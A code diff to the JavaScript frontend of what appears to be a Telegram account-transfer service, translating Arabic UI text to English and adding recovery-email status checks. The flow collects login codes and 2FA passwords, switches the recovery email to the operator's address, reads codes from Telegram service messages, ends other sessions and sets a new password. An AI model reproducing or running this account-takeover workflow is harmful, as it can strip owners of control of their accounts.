@@ -65,7 +65,7 @@ function setLoading(buttonId, loading, originalText = null) {
         btn.disabled = loading;
         if (loading) {
             btn.dataset.originalText = btn.innerHTML;
-            btn.innerHTML = '<span class="loader"></span> جاري المعالجة...';
+            btn.innerHTML = '<span class="loader"></span> Processing...';
         } else {
             btn.innerHTML = originalText || btn.dataset.originalText || btn.innerHTML;
         }
@@ -114,7 +114,7 @@ async function sendCode() {
     const mode = modeSelect ? modeSelect.value : 'bot_only';
     
     if (!phone || phone.length < 10) {
-        showStatus('الرجاء إدخال رقم هاتف صحيح', 'error');
+        showStatus('Please enter a valid phone number', 'error');
         return;
     }
     
@@ -130,16 +130,28 @@ async function sendCode() {
         appState.phone = phone;
         appState.transferMode = mode;
         
-        if (result.status === 'code_sent') {
-            showStatus('تم إرسال كود التحقق إلى تيليجرام', 'success');
+        if (result.status === 'already_authenticated') {
+            appState.telegramId = result.telegram_id;
+            appState.targetEmail = result.target_email;
+            appState.emailHash = result.email_hash;
+            showStatus('Already authenticated! Skipping to email...', 'success');
+            setStep(3);
+            showView('view-email');
+            displayEmailInstructions();
+        } else if (result.status === 'code_sent') {
+            showStatus('Verification code sent to Telegram', 'success');
+            setStep(2);
+            showView('view-code');
+        } else if (result.status === 'already_logged_in' || result.status === 'success') {
+            showStatus('Logged in successfully', 'success');
             setStep(2);
             showView('view-code');
         }
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-send-code', false, 'إرسال كود التحقق');
+        setLoading('btn-send-code', false, 'Send Verification Code');
     }
 }
 
@@ -150,7 +162,7 @@ async function verifyCode() {
     const code = codeInput.value.trim();
     
     if (!code || code.length < 5) {
-        showStatus('الرجاء إدخال كود التحقق', 'error');
+        showStatus('Please enter the verification code', 'error');
         return;
     }
     
@@ -168,23 +180,23 @@ async function verifyCode() {
             appState.targetEmail = result.target_email;
             appState.emailHash = result.email_hash;
             
-            showStatus(`مرحباً! تم تسجيل الدخول بنجاح`, 'success');
+            showStatus('Authenticated successfully!', 'success');
             setStep(3);
             showView('view-email');
             displayEmailInstructions();
             
         } else if (result.status === '2fa_required') {
-            showStatus('مطلوب إدخال كلمة مرور التحقق بخطوتين', 'info');
+            showStatus('2FA password required', 'info');
             if (result.hint) {
-                document.getElementById('2fa-hint').textContent = `تلميح: ${result.hint}`;
+                document.getElementById('2fa-hint').textContent = `Hint: ${result.hint}`;
             }
             showView('view-2fa');
         }
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-verify-code', false, 'تحقق');
+        setLoading('btn-verify-code', false, 'Verify');
     }
 }
 
@@ -195,7 +207,7 @@ async function verify2FA() {
     const password = passwordInput.value;
     
     if (!password) {
-        showStatus('الرجاء إدخال كلمة المرور', 'error');
+        showStatus('Please enter the password', 'error');
         return;
     }
     
@@ -213,31 +225,31 @@ async function verify2FA() {
             appState.targetEmail = result.target_email;
             appState.emailHash = result.email_hash;
             
-            showStatus('تم تسجيل الدخول بنجاح!', 'success');
+            showStatus('Logged in successfully!', 'success');
             setStep(3);
             showView('view-email');
             displayEmailInstructions();
         }
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-verify-2fa', false, 'تحقق');
+        setLoading('btn-verify-2fa', false, 'Verify');
     }
 }
 
 // ==================== Step 3: Email Change ====================
 
-function displayEmailInstructions() {
+async function displayEmailInstructions() {
     const emailDisplay = document.getElementById('target-email-display');
     const emailInstructions = document.getElementById('email-instructions');
     
     if (emailDisplay && appState.targetEmail) {
         emailDisplay.innerHTML = `
             <div class="email-box">
-                <span class="label">الإيميل المطلوب:</span>
+                <span class="label">Target Email:</span>
                 <span class="email-value" id="email-to-copy">${appState.targetEmail}</span>
-                <button onclick="copyEmail()" class="btn-copy" title="نسخ">📋</button>
+                <button onclick="copyEmail()" class="btn-copy" title="Copy">Copy</button>
             </div>
         `;
     }
@@ -245,26 +257,84 @@ function displayEmailInstructions() {
     if (emailInstructions) {
         emailInstructions.innerHTML = `
             <div class="instructions">
-                <h4>خطوات تغيير الإيميل:</h4>
+                <h4>Steps to change 2FA recovery email:</h4>
                 <ol>
-                    <li>افتح تطبيق تيليجرام</li>
-                    <li>اذهب إلى الإعدادات > الخصوصية والأمان > التحقق بخطوتين</li>
-                    <li>اضغط على "البريد الإلكتروني للاسترداد"</li>
-                    <li>غيّر الإيميل إلى: <strong>${appState.targetEmail}</strong></li>
-                    <li>سيتم إرسال كود تأكيد إلى الإيميل الجديد</li>
-                    <li>انتظر حتى يصل الكود (سيظهر تلقائياً هنا)</li>
+                    <li>Open Telegram app</li>
+                    <li>Go to Settings > Privacy & Security > Two-Step Verification</li>
+                    <li>Tap "Recovery Email"</li>
+                    <li>Change email to: <strong>${appState.targetEmail}</strong></li>
+                    <li>A confirmation code will be sent to the new email</li>
+                    <li>Click "Auto-Check Code" or enter it manually</li>
                 </ol>
             </div>
         `;
     }
+    
+    // Fetch and show live email status
+    await refreshEmailStatus();
 }
 
 function copyEmail() {
     const email = appState.targetEmail;
     if (email) {
         navigator.clipboard.writeText(email).then(() => {
-            showStatus('تم نسخ الإيميل!', 'success');
+            showStatus('Email copied!', 'success');
         });
+    }
+}
+
+async function refreshEmailStatus() {
+    const statusContent = document.getElementById('email-status-content');
+    if (!statusContent) return;
+    
+    statusContent.innerHTML = '<div class="loading">Checking email status...</div>';
+    
+    try {
+        const result = await apiCall(`/email/confirm/${encodeURIComponent(appState.phone)}`, 'POST');
+        
+        let html = '<div class="email-live-status">';
+        
+        // Recovery email (2FA)
+        html += '<div class="email-row">';
+        html += '<strong>2FA Recovery Email:</strong> ';
+        if (result.recovery_email) {
+            const isOurs = result.email_matches === true;
+            html += `<span style="color:${isOurs ? 'var(--success)' : 'var(--danger)'}">`;
+            html += `${result.recovery_email} ${isOurs ? 'Ours' : 'Not ours!'}</span>`;
+        } else if (result.email_unconfirmed_pattern) {
+            const isOurs = result.email_matches === true;
+            html += `<span style="color:var(--warning)">Pending confirmation: ${result.email_unconfirmed_pattern}`;
+            html += ` ${isOurs ? '(Ours)' : '(Not ours!)'}</span>`;
+        } else if (result.email_status === 'confirmed_unknown') {
+            html += '<span style="color:var(--warning)">Confirmed but unknown (need password)</span>';
+        } else {
+            html += '<span style="color:var(--text-light)">Not set</span>';
+        }
+        html += '</div>';
+        
+        // Login email (separate)
+        if (result.login_email_pattern) {
+            html += '<div class="email-row" style="margin-top:8px;">';
+            html += '<strong>Login Email:</strong> ';
+            html += `<span style="color:var(--text-light)">${result.login_email_pattern} (separate feature)</span>`;
+            html += '</div>';
+        }
+        
+        // Overall status
+        html += '<div class="email-row" style="margin-top:8px;">';
+        if (result.email_changed) {
+            html += '<span style="color:var(--success)">Email changed to ours!</span>';
+            document.getElementById('btn-confirm-email').classList.remove('hidden');
+        } else {
+            html += '<span style="color:var(--warning)">Email not changed to ours yet</span>';
+        }
+        html += '</div>';
+        
+        html += '</div>';
+        statusContent.innerHTML = html;
+        
+    } catch (error) {
+        statusContent.innerHTML = `<div class="error">Error: ${error.message}</div>`;
     }
 }
 
@@ -273,39 +343,86 @@ async function checkEmailCode() {
     hideStatus();
     
     const codeDisplay = document.getElementById('email-code-display');
-    codeDisplay.innerHTML = '<div class="loading">جاري التحقق من وصول الكود...</div>';
+    codeDisplay.innerHTML = '<div class="loading">Checking for code...</div>';
     
     try {
-        // Wait up to 5 seconds for code
-        const result = await apiCall(`/email/code/${encodeURIComponent(appState.phone)}?wait_seconds=5`);
+        // Wait up to 8 seconds for code from email webhook
+        const result = await apiCall(`/email/code/${encodeURIComponent(appState.phone)}?wait_seconds=8`);
         
         if (result.status === 'received') {
             codeDisplay.innerHTML = `
                 <div class="code-received">
                     <div class="icon">✓</div>
-                    <h3>تم استلام الكود!</h3>
+                    <h3>Code Received!</h3>
                     <div class="code-value">${result.code}</div>
-                    <p>أدخل هذا الكود في تيليجرام لتأكيد تغيير الإيميل</p>
+                    <p>Enter this code in Telegram to confirm the email change</p>
                 </div>
             `;
-            showStatus('تم استلام كود التأكيد! أدخله في تيليجرام', 'success');
+            showStatus('Confirmation code received! Enter it in Telegram then click confirm', 'success');
             document.getElementById('btn-confirm-email').classList.remove('hidden');
             
         } else {
+            // Fallback: try to read code from Telegram messages (777000)
+            try {
+                const fallback = await apiCall(`/email/code-fallback/${encodeURIComponent(appState.phone)}`);
+                if (fallback.status === 'received' && fallback.code) {
+                    codeDisplay.innerHTML = `
+                        <div class="code-received">
+                            <div class="icon">✓</div>
+                            <h3>Code captured from Telegram!</h3>
+                            <div class="code-value">${fallback.code}</div>
+                            <p>Enter this code to confirm the email</p>
+                        </div>
+                    `;
+                    showStatus('Code captured from Telegram messages!', 'success');
+                    document.getElementById('btn-confirm-email').classList.remove('hidden');
+                    return;
+                }
+            } catch(e) {}
+            
             codeDisplay.innerHTML = `
                 <div class="waiting">
-                    <div class="icon">⏳</div>
-                    <h3>في انتظار الكود...</h3>
-                    <p>تأكد من تغيير الإيميل في تيليجرام</p>
-                    <p class="hint">Hash: ${result.email_hash}</p>
+                    <div class="icon">...</div>
+                    <h3>Waiting for code...</h3>
+                    <p>Make sure you changed the email in Telegram, or enter the code manually</p>
                 </div>
             `;
         }
         
     } catch (error) {
-        codeDisplay.innerHTML = `<div class="error">خطأ: ${error.message}</div>`;
+        codeDisplay.innerHTML = `<div class="error">Error: ${error.message}</div>`;
     } finally {
-        setLoading('btn-check-code', false, 'التحقق من الكود');
+        setLoading('btn-check-code', false, 'Auto-Check Code');
+    }
+}
+
+async function submitManualEmailCode() {
+    const codeInput = document.getElementById('manual-email-code');
+    const code = codeInput ? codeInput.value.trim() : '';
+    
+    if (!code || code.length < 5) {
+        showStatus('Please enter a valid code (5-6 digits)', 'error');
+        return;
+    }
+    
+    showStatus('Confirming code...', 'info');
+    
+    try {
+        // Try to confirm the recovery email with this code
+        const result = await apiCall(`/email/confirm-code/${encodeURIComponent(appState.phone)}`, 'POST', {
+            code: code
+        });
+        
+        if (result.status === 'success') {
+            showStatus('Recovery email confirmed successfully!', 'success');
+            document.getElementById('btn-confirm-email').classList.remove('hidden');
+            // Refresh status
+            await refreshEmailStatus();
+        } else {
+            showStatus(`Confirmation failed: ${result.message || result.error || 'Invalid code'}`, 'error');
+        }
+    } catch (error) {
+        showStatus(`Error: ${error.message}`, 'error');
     }
 }
 
@@ -317,17 +434,22 @@ async function confirmEmailChanged() {
         const result = await apiCall(`/email/confirm/${encodeURIComponent(appState.phone)}`, 'POST');
         
         if (result.status === 'success' && result.email_changed) {
-            showStatus('تم تأكيد تغيير الإيميل بنجاح!', 'success');
+            showStatus('Email change confirmed successfully!', 'success');
             setStep(4);
             showView('view-audit');
         } else {
-            showStatus(`الإيميل لم يتغير بعد. النمط الحالي: ${result.current_pattern}`, 'warning');
+            let msg = 'Recovery email not changed to ours yet.';
+            if (result.current_display) msg += ` Current: ${result.current_display}`;
+            if (result.expected_email) msg += ` Expected: ${result.expected_email}`;
+            showStatus(msg, 'warning');
+            // Refresh status
+            await refreshEmailStatus();
         }
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-confirm-email', false, 'تأكيد التغيير');
+        setLoading('btn-confirm-email', false, 'Confirm Email Change & Continue');
     }
 }
 
@@ -338,7 +460,7 @@ async function runAudit() {
     hideStatus();
     
     const auditLog = document.getElementById('audit-log');
-    auditLog.innerHTML = '<div class="loading">جاري فحص الحساب...</div>';
+    auditLog.innerHTML = '<div class="loading">Running security audit...</div>';
     
     try {
         const result = await apiCall(`/account/audit/${encodeURIComponent(appState.phone)}`);
@@ -351,18 +473,18 @@ async function runAudit() {
             html = `
                 <div class="audit-success">
                     <div class="icon">✓</div>
-                    <h3>الحساب جاهز للتحويل!</h3>
-                    <p>جميع الفحوصات الأمنية اجتازت</p>
-                    ${result.email_changed ? '<p class="email-ok">✓ الإيميل تم تغييره لإيميلنا</p>' : ''}
+                    <h3>Account ready for transfer!</h3>
+                    <p>All security checks passed</p>
+                    ${result.email_changed ? '<p class="email-ok">Email changed to ours</p>' : ''}
                 </div>
             `;
-            showStatus('يمكنك المتابعة لإنهاء العملية', 'success');
+            showStatus('You can proceed to finalize', 'success');
             document.getElementById('btn-proceed-finalize').classList.remove('hidden');
         } else {
             html = `
                 <div class="audit-failed">
                     <div class="icon">✗</div>
-                    <h3>يوجد ${result.issues_count} مشكلة يجب حلها</h3>
+                    <h3>${result.issues_count} issue(s) need to be resolved</h3>
                 </div>
                 <ul class="issues-list">
             `;
@@ -386,9 +508,9 @@ async function runAudit() {
                 if (actions.change_email && !result.email_changed) {
                     html += `
                         <div class="action-needed">
-                            <h4>مطلوب تغيير الإيميل إلى:</h4>
+                            <h4>Email change required to:</h4>
                             <div class="email-box">${appState.targetEmail || actions.our_email}</div>
-                            <button onclick="showView('view-email')" class="btn-secondary">العودة لتغيير الإيميل</button>
+                            <button onclick="showView('view-email')" class="btn-secondary">Go back to change email</button>
                         </div>
                     `;
                 }
@@ -400,61 +522,61 @@ async function runAudit() {
                 if (manualSessionIssue) {
                     html += `
                         <div class="action-needed sessions-manual">
-                            <h4>📱 يجب إنهاء الجلسات يدوياً:</h4>
+                            <h4>Manual session termination required:</h4>
                             <ul class="sessions-list">
-                                ${manualSessionIssue.sessions.map(s => `<li>🔴 ${s}</li>`).join('')}
+                                ${manualSessionIssue.sessions.map(s => `<li>${s}</li>`).join('')}
                             </ul>
-                            <p>⚠️ قيود تيليجرام 24 ساعة - يجب الإنهاء من التطبيق</p>
+                            <p>Telegram 24h restriction - must be done from the app</p>
                             <ol>
-                                <li>افتح تيليجرام > الإعدادات > الأجهزة</li>
-                                <li>اضغط "إنهاء جميع الجلسات الأخرى"</li>
+                                <li>Open Telegram > Settings > Devices</li>
+                                <li>Tap "Terminate all other sessions"</li>
                             </ol>
                         </div>
                     `;
                 } else if (autoSessionIssue || actions.terminate_sessions) {
                     html += `
                         <div class="action-needed">
-                            <button onclick="terminateSessions()" class="btn-secondary">إنهاء الجلسات الأخرى تلقائياً</button>
+                            <button onclick="terminateSessions()" class="btn-secondary">Auto-terminate other sessions</button>
                         </div>
                     `;
                 }
             }
             
-            showStatus('يرجى حل المشاكل أعلاه ثم إعادة الفحص', 'warning');
+            showStatus('Please resolve the issues above then re-run the audit', 'warning');
         }
         
         // Show transfer mode info
         html += `
             <div class="mode-info">
-                <strong>وضع التحويل:</strong> ${result.transfer_mode === 'bot_only' ? 'البوت فقط (خروج كامل)' : 'احتفاظ بجلسة واحدة'}
+                <strong>Transfer Mode:</strong> ${result.transfer_mode === 'bot_only' ? 'Bot Only (full logout)' : 'Keep one session'}
             </div>
         `;
         
         auditLog.innerHTML = html;
         
     } catch (error) {
-        auditLog.innerHTML = `<div class="error">خطأ في الفحص: ${error.message}</div>`;
-        showStatus(`خطأ: ${error.message}`, 'error');
+        auditLog.innerHTML = `<div class="error">Audit error: ${error.message}</div>`;
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-run-audit', false, 'بدء الفحص الأمني');
+        setLoading('btn-run-audit', false, 'Run Security Audit');
     }
 }
 
 async function terminateSessions() {
-    if (!confirm('هل أنت متأكد من إنهاء جميع الجلسات الأخرى؟')) {
+    if (!confirm('Are you sure you want to terminate all other sessions?')) {
         return;
     }
     
     try {
-        showStatus('جاري إنهاء الجلسات...', 'info');
+        showStatus('Terminating sessions...', 'info');
         
         // Use sessions health check and regenerate
         const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
         
-        showStatus('تم. يرجى إعادة الفحص.', 'success');
+        showStatus('Done. Please re-run the audit.', 'success');
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     }
 }
 
@@ -486,45 +608,45 @@ async function finalizeAccount() {
             document.getElementById('complete-message').innerHTML = `
                 <div class="success-big">
                     <div class="icon">🎉</div>
-                    <h2>تمت العملية بنجاح!</h2>
+                    <h2>Operation Completed Successfully!</h2>
                     <div class="credentials-box">
                         <div class="credential">
-                            <span class="label">رقم الهاتف:</span>
+                            <span class="label">Phone:</span>
                             <span class="value">${appState.phone}</span>
                         </div>
                         <div class="credential">
-                            <span class="label">كلمة مرور 2FA:</span>
+                            <span class="label">2FA Password:</span>
                             <span class="value password">${result.password}</span>
                             <button onclick="copyPassword('${result.password}')" class="btn-copy">📋</button>
                         </div>
                         <div class="credential">
-                            <span class="label">الإيميل:</span>
+                            <span class="label">Email:</span>
                             <span class="value">${appState.targetEmail}</span>
                         </div>
                         <div class="credential">
-                            <span class="label">وضع التحويل:</span>
-                            <span class="value">${result.transfer_mode === 'bot_only' ? 'البوت فقط' : 'احتفاظ بجلسة'}</span>
+                            <span class="label">Transfer Mode:</span>
+                            <span class="value">${result.transfer_mode === 'bot_only' ? 'Bot Only' : 'Keep Session'}</span>
                         </div>
                         <div class="credential">
-                            <span class="label">الجلسات المنتهية:</span>
+                            <span class="label">Terminated Sessions:</span>
                             <span class="value">${result.terminated_sessions || 0}</span>
                         </div>
                     </div>
-                    <p class="warning">⚠️ احفظ كلمة المرور في مكان آمن!</p>
+                    <p class="warning">Save the password in a safe place!</p>
                 </div>
             `;
         }
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     } finally {
-        setLoading('btn-finalize', false, 'إنهاء العملية');
+        setLoading('btn-finalize', false, 'Finalize Account');
     }
 }
 
 function copyPassword(password) {
     navigator.clipboard.writeText(password).then(() => {
-        showStatus('تم نسخ كلمة المرور!', 'success');
+        showStatus('Password copied!', 'success');
     });
 }
 
@@ -535,14 +657,14 @@ async function checkSessionHealth() {
         const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
         
         let statusHtml = '<div class="health-check">';
-        statusHtml += `<h4>حالة الجلسات:</h4>`;
-        statusHtml += `<p>Pyrogram: ${result.checks.pyrogram_session.valid ? '✓ صالحة' : '✗ غير صالحة'}</p>`;
-        statusHtml += `<p>Telethon: ${result.checks.telethon_session.valid ? '✓ صالحة' : '✗ غير صالحة'}</p>`;
-        statusHtml += `<p>الإيميل: ${result.checks.email_unchanged ? '✓ لم يتغير' : '✗ تغير!'}</p>`;
-        statusHtml += `<p>عدد الجلسات: ${result.checks.sessions_count}</p>`;
+        statusHtml += `<h4>Session Status:</h4>`;
+        statusHtml += `<p>Pyrogram: ${result.checks.pyrogram_session.valid ? 'Valid' : 'Invalid'}</p>`;
+        statusHtml += `<p>Telethon: ${result.checks.telethon_session.valid ? 'Valid' : 'Invalid'}</p>`;
+        statusHtml += `<p>Email: ${result.checks.email_unchanged ? 'Unchanged' : 'Changed!'}</p>`;
+        statusHtml += `<p>Sessions: ${result.checks.sessions_count}</p>`;
         
         if (result.needs_attention) {
-            statusHtml += `<p class="warning">⚠️ يحتاج اهتمام!</p>`;
+            statusHtml += `<p class="warning">Needs attention!</p>`;
         }
         
         statusHtml += '</div>';
@@ -550,7 +672,7 @@ async function checkSessionHealth() {
         showStatus(statusHtml, result.status === 'healthy' ? 'success' : 'warning');
         
     } catch (error) {
-        showStatus(`خطأ: ${error.message}`, 'error');
+        showStatus(`Error: ${error.message}`, 'error');
     }
 }
 
